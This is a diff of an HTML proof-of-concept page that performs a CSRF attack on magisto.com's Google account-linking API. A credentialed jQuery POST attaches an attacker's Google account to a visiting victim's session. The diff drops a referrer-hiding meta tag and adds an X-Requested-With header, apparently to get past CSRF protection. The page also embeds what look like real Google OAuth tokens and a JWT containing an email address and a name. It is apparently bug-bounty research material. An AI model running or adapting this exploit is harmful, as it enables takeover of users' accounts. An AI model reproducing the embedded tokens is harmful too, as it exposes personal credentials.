@@ -2,7 +2,6 @@
 <html>
 <head>
 <title>CSRF bypass for connect attacker google account</title>
-<meta name="referrer" content="never">
 <script src=/jquery-3.4.1.min.js></script>
 </head>
 <body>
@@ -15,6 +14,9 @@ function openWin(){
 	 $.ajax({
 			    url : 'https://www.magisto.com/api/google_attach',
 			    type : 'POST',
+		            headers: {
+        			X-Requested-With: "XMLHttpRequest"
+    			 },
 			    data:{method:"GOOGLE",provider:"google",id_token:"eyJhbGciOiJSUzI1NiIsImtpZCI6IjRlNGViZTQ4N2Q1Y2RmMmIwMjZhM2IyMjlkODZmMGQ0MjU4NDQ5ZmUiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJhY2NvdW50cy5nb29nbGUuY29tIiwiYXpwIjoiNzc0MjQ3MDA0OTUyLWU5ZW5hYmlhOW4xZDVtM282aGM4cXA4NHYyb2NqYXYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwiYXVkIjoiNzc0MjQ3MDA0OTUyLWU5ZW5hYmlhOW4xZDVtM282aGM4cXA4NHYyb2NqYXYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwic3ViIjoiMTEyMzg3OTU3MTY3NTE5Mjc3NTY2IiwiZW1haWwiOiJqb2huc3Rvbi4xaDFAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsImF0X2hhc2giOiI0dDE3RVBrWnBHaUVUMVpIOER4U0xBIiwibmFtZSI6InN0b25lIGpvaG4iLCJwaWN0dXJlIjoiaHR0cHM6Ly9saDUuZ29vZ2xldXNlcmNvbnRlbnQuY29tLy1FajJsSWo5UGZucy9BQUFBQUFBQUFBSS9BQUFBQUFBQUFBQS9BTVp1dWNuMHJSUHBjT3ZYdlc5c0hNcFZEdWk0QTc5LUtRL3M5Ni1jL3Bob3RvLmpwZyIsImdpdmVuX25hbWUiOiJzdG9uZSIsImZhbWlseV9uYW1lIjoiam9obiIsImxvY2FsZSI6InpoLUNOIiwiaWF0IjoxNTk0OTkzMjEyLCJleHAiOjE1OTQ5OTY4MTIsImp0aSI6IjE4Yzk0N2U0NmRjYjA0ZjU0ODk2NjFmYWVjNDVhYjVlZDg3MWUwNDIifQ.peDncObi5RE33O5J9JPdv1MgX_iHNODjNU5riaYU0ntKY7psxr8zcUTWoyHr69-MQIItVjwzYiA33DFn8JR5ChHHhPVnZLU5Ees9W9Pb5U2XZvtHLApEBhKtF_QNs9de1sABV1pWzvdTPIF_V5eYc9M6DLhYM39tn3kcD6D9JUJEnpbcNfX6o0EMZbHGgnOyb7koPvo6S08IxOfnmYfAWaiktooS9hb47wiMj3tCLGd_dXi7roGpDuqL52Mhal2a5m3D25QtPewP7yFLO80webOXOVKpo_QHLIIYVjPvpT_jpqxUqhETJnYD2b16GFfmVo-6HMjOLGBiont1HyC5jw",google_access_token:"ya29.a0AfH6SMAIsqCMM_58sfvvaoPceprrkmowgShIm8i763nxDfvFdh0oYn79S3DgMCtUlsdIKP36M12_HRgziN3Fjjm7WgODPaPTSEBdnPUAj3Y7e6s27ksUIwoTtuRpclB3ty844o_K2cbFaQgvwfMOMvD55nikkxl1raE",expires:"999999999999",keep_email:"1",device_id:"684411594991753831"},
 			    xhrFields: {
 			     withCredentials: true
